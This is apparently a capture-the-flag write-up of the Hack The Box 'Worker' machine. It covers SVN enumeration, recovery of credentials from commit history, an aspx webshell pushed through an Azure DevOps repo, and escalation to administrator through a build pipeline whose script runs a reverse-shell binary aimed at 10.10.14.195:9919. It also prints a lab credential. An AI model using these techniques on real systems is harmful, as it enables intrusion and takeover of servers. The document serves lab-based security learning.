Going to the website, we see the default IIS page:

So I’m going to look into port 3690. Using svn list, I can see a list of files in the repository:


└──╼ $svn list svn://10.10.10.203

dimension.worker.htb/

moved.txt

test.txt

I use svn export to download all the files and also add dimension.worker.htb to my hosts list. Aswell as that, I run a wfuzz for possible other vhosts. Wfuzz comes back with:

daesungco.worker.htb links to another IIS page.

Inside the directory of files we downloaded, we see a file named moved.txt:

So I add devops.worker.htb to my hosts and when going to view in a web browser requests for a username and password:

We also have a file named hash.txt containing:


└──╼ $cat hash.txt

9287b30d4bf08f067a41584c4a28ca50

de2d066284d0a4193cd55a9cadde1aa1

These hashes do not work but thinking about the information that we have been given, I look at previous commit history to see if there are any credentials:

There are no files that I downloaded called deploy.ps1 so I begin looking at those files:

So I have some possible credentials for devops.worker.htb I type these in and get an azure devops page:

I can go into this project and it shows typical git project layout:

I can go into repos and have access to spectral which is one of the subdomains I found earlier. I can upload a file to this which will be executed by the server. Given that I saw the IIS I opt for an aspx webshell which I can then run commands from.

I cannot merge the file straight to master:

So must make a new branch, create a pull request and then merge it. I also have to add a work item so that my pull request can be merged.

After that, I can browse to spectral.worker.htb and am presented with the webshell:

I replace the arguments with the command for a powershell reverse shell and run it

Running winPEAS, I can see another disk is present, W::

Looking around this, there is a directory inside www called conf:

This has a file inside called passwd which appears to contain a list of usernames and passwords:

Looking at users on the box, there is only one username with a password on the list:

So matching robisl with the matching password in the file, we can see:

So we have a full credential: robisl:wolves11 Using this, I can log with evil-winrm:

Using this user, I can log into the devops page:

Looking at the project settings, I can see:

Which means if I use the Setup pool, this runs as administrator meaning I can get a shell from it

First, I create a new build pipeline:

Which shows:

I select Azure Repos Git which then shows:

Where I select the only repository present (PartsUnlimited). Now I can select how to configure my pipeline:

I choose to use Starter pipeline which shows:

Now I can configure my reverse shell. I upload my xc shell binary through evil-winrm so that I am able to call it and get a nice reverse shell. I start by changing the pool to Setup and also change the script in step 1 from echo Hello, world! to C:\Users\robisl\Downloads\cre4k\xc.exe 10.10.14.195 9919 which would then be received by my reverse listener. The final configuration looks like:

I click save and run and then create a new branch for the commit (since I can’t commit straight to master). Then I click save and run and upon execution of my command in the script:

I get a call back on my reverse listener:

And I am administrator!:
